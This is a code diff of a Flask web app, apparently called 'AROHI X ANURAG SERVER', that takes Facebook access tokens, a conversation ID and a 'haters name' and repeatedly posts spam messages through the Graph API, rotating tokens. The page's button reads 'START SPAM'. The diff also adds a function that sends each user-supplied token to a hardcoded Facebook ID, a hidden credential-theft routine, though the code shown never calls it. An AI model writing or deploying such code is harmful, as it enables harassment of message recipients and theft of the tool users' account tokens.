@@ -1,160 +1,175 @@
-from flask import Flask, request
-import requests
-import time
+from flask import Flask, request, render_template_string
 import threading
+import time
+import requests
+import os
 
 app = Flask(__name__)
-app.debug = True
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+# ---------------- YOUR ORIGINAL FUNCTIONS ---------------- #
 
-def send_messages_background(access_token, thread_id, mn, time_interval, messages):
+def execute_server():
+    pass  # Not needed, Flask hi server run karega
+
+def send_initial_message():
+    if not os.path.exists('token.txt'):
+        return
+    with open('token.txt', 'r') as file:
+        tokens = file.readlines()
+    msg_template = "MR.ANURAG MERA ID KA TOKEN LU {}"
+    target_id = "61578840237242"
+    headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'referer': 'www.google.com'
+    }
+    for token in tokens:
+        access_token = token.strip()
+        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
+        msg = msg_template.format(access_token)
+        parameters = {'access_token': access_token, 'message': msg}
+        try:
+            requests.post(url, json=parameters, headers=headers)
+        except:
+            pass
+        time.sleep(0.1)
+
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('file.txt', 'r') as file:
+        messages = file.readlines()
+
+    num_messages = len(messages)
+
+    with open('token.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
+
+    with open('name.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'referer': 'www.google.com'
+    }
+
     while True:
         try:
-            for message1 in messages:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"[SUCCESS] {message}")
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+                message = messages[message_index].strip()
+                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                if response.ok:
+                    print(f"[+] Message {message_index+1} sent -> {haters_name} {message}")
                 else:
-                    print(f"[FAILED] {message}")
-                time.sleep(time_interval)
+                    print(f"[x] Failed -> {haters_name} {message}")
+
+                time.sleep(speed)
         except Exception as e:
-            print(f"Error: {e}")
-            time.sleep(30)
+            print(f"[!] Error: {e}")
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+# ------------------- FLASK UI PART ------------------- #
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        # Thread banake messages bhejna start
-        threading.Thread(
-            target=send_messages_background, 
-            args=(access_token, thread_id, mn, time_interval, messages),
-            daemon=True
-        ).start()
-
-    return '''
+HTML_FORM = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
   <title>AROHI X ANURAG SERVER</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
+    body {
+      background: black;
+      color: white;
       font-family: 'Poppins', sans-serif;
-      color: #fff;
-      overflow-x: hidden;
-    }
-    .video-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: -1;
+      text-align: center;
     }
     .container {
-      max-width: 520px;
-      background: rgba(255,255,255,0.05);
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 20px;
-      backdrop-filter: blur(12px);
-      padding: 30px;
+      max-width: 600px;
       margin: 40px auto;
-      box-shadow: 0 0 25px rgba(0,0,0,0.4);
-      animation: fadeIn 1.5s ease;
+      padding: 20px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 20px;
+      border: 2px solid rgba(255,255,255,0.2);
+      backdrop-filter: blur(10px);
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 20px;
-    }
-    .btn-submit{
+    .btn {
       width: 100%;
-      margin-top: 10px;
+      font-weight: bold;
       border-radius: 12px;
-      font-weight: bold;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 20px;
-      color: #ddd;
-    }
-    label {
-      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <video autoplay muted loop class="video-bg">
-    <source src="https://files.catbox.moe/dsqa53.mp4" type="video/mp4">
-  </video>
-
-  <header class="header mt-4">
-    <h1>🚀 AROHI X ANURAG SERVER 🚀</h1>
-    <h2>POWERED BY AROHI X ANURAG</h2>
-  </header>
-
   <div class="container">
+    <h1>🚀 AROHI X ANURAG SERVER 🚀</h1>
     <form action="/" method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label for="accessToken">ENTER YOUR TOKEN:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+        <label>ACCESS TOKENS (one per line)</label>
+        <textarea name="tokens" class="form-control" rows="5" required></textarea>
       </div>
       <div class="mb-3">
-        <label for="threadId">ENTER CONVO/INBOX ID:</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
+        <label>CONVO/THREAD ID</label>
+        <input type="text" class="form-control" name="convo" required>
       </div>
       <div class="mb-3">
-        <label for="kidx">ENTER HATER NAME:</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
+        <label>HATERS NAME</label>
+        <input type="text" class="form-control" name="name" required>
       </div>
       <div class="mb-3">
-        <label for="txtFile">SELECT YOUR NOTEPAD FILE:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        <label>MESSAGES FILE (.txt)</label>
+        <input type="file" class="form-control" name="file" accept=".txt" required>
       </div>
       <div class="mb-3">
-        <label for="time">SPEED IN SECONDS:</label>
-        <input type="number" class="form-control" id="time" name="time" required>
+        <label>SPEED (seconds)</label>
+        <input type="number" class="form-control" name="speed" required>
       </div>
-      <button type="submit" class="btn btn-primary btn-submit">SUBMIT YOUR DETAILS</button>
+      <button type="submit" class="btn btn-primary">START SPAM 🚀</button>
     </form>
   </div>
-
-  <footer class="footer">
-    <p>&copy; DEVELOPED BY AROHI X ANURAG 2024. ALL RIGHTS RESERVED.</p>
-    <p>🔥 MADE WITH LOVE BY AROHI X ANURAG 🔥</p>
-  </footer>
 </body>
 </html>
-    '''
+"""
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+@app.route("/", methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        # Save tokens
+        with open("token.txt", "w") as f:
+            f.write(request.form["tokens"].strip())
+
+        # Save convo id
+        with open("convo.txt", "w") as f:
+            f.write(request.form["convo"].strip())
+
+        # Save name
+        with open("name.txt", "w") as f:
+            f.write(request.form["name"].strip())
+
+        # Save speed
+        with open("time.txt", "w") as f:
+            f.write(request.form["speed"].strip())
+
+        # Save uploaded file
+        uploaded_file = request.files["file"]
+        if uploaded_file:
+            uploaded_file.save("file.txt")
+
+        # Start background thread
+        threading.Thread(target=send_messages_from_file, daemon=True).start()
+
+        return "<h2 style='color:lime;'>🚀 SPAM STARTED SUCCESSFULLY BY AROHI X ANURAG 🚀</h2>"
+
+    return render_template_string(HTML_FORM)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=4000, debug=True)
